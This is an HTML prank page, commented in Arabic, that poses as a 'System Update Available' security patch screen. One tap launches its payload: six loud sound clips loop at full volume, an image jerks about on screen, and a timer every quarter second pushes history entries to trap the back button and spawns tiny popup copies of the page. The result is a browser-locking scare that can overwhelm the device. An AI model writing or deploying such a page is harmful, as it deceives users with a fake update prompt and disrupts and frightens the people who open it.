<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
        
        /* الصورة واضحة، مصغرة شوية، وتتحرك بجنون سواسوة */
        #madwoman { 
            width: 85%;
            height: auto;
            max-height: 85vh;
            object-fit: contain;
            z-index: 1;
            display: none;
            will-change: transform;
        }

        #ui { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #f4f4f4; z-index: 1000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center;
            font-family: sans-serif; color: #333;
        }
        .header { color: #0056b3; font-size: 24px; margin-bottom: 10px; font-weight: bold; }
        .msg { font-size: 16px; margin-bottom: 30px; text-align: center; padding: 0 20px; }
        .btn-fix { 
            background: #007bff; color: #fff; border: none; padding: 15px 40px; 
            border-radius: 5px; font-size: 18px; cursor: pointer;
        }
    </style>
</head>
<body onclick="launchNightmare()">

    <div id="ui">
        <div class="header">System Update Available</div>
        <div class="msg">Security patch 2.4.1 is ready.<br>Tap to optimize performance.</div>
        <button class="btn-fix">Update Now</button>
    </div>

    <img id="madwoman" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="horrorSounds">
        <audio class="s" loop preload="auto"><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
        <audio class="s" loop preload="auto"><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
        <audio class="s" loop preload="auto"><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
        <audio class="s" loop preload="auto"><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
        <audio class="s" loop preload="auto"><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
        <audio class="s" loop preload="auto"><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
    </div>

    <script>
        let aCtx, analyser, data;
        const img = document.getElementById('madwoman');

        function launchNightmare() {
            // 1. تفعيل الصوت سواسوة
            document.querySelectorAll('.s').forEach(a => { a.volume = 1.0; a.play(); });

            document.getElementById('ui').style.display = 'none';
            img.style.display = 'block';

            // 2. نظام الحبس واللاق سواسوة
            setInterval(() => {
                history.pushState(null, null, window.location.href);
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 250);

            // 3. تفعيل المحرك البصري سواسوة
            if (!aCtx) {
                setupAudioReaction();
            }
        }

        function setupAudioReaction() {
            aCtx = new (window.AudioContext || window.webkitAudioContext)();
            // نربط المحلل بأول صوت سواسوة
            const source = aCtx.createMediaElementSource(document.querySelector('.s'));
            analyser = aCtx.createAnalyser();
            analyser.fftSize = 128;
            data = new Uint8Array(analyser.frequencyBinCount);
            source.connect(analyser);
            analyser.connect(aCtx.destination);
            
            // استئناف الـ context إذا كان معلقاً سواسوة
            if (aCtx.state === 'suspended') {
                aCtx.resume();
            }
            
            animateMadly();
        }

        function animateMadly() {
            analyser.getByteFrequencyData(data);
            let volume = 0;
            for(let i=0; i<data.length; i++) volume += data[i];
            volume = volume / data.length;

            // 4. الحركة المجنونة القوية سواسوة
            const shake = (volume / 255) * 60; // سعة الحركة
            const rot = (Math.random() - 0.5) * shake;
            const tx = (Math.random() - 0.5) * shake * 2;
            const ty = (Math.random() - 0.5) * shake * 2;
            const sc = 1 + (volume / 255) * 0.3; // تكبير الصورة مع الصوت

            img.style.transform = `translate(${tx}px, ${ty}px) rotate(${rot}deg) scale(${sc})`;
            
            requestAnimationFrame(animateMadly);
        }
    </script>
</body>
</html>
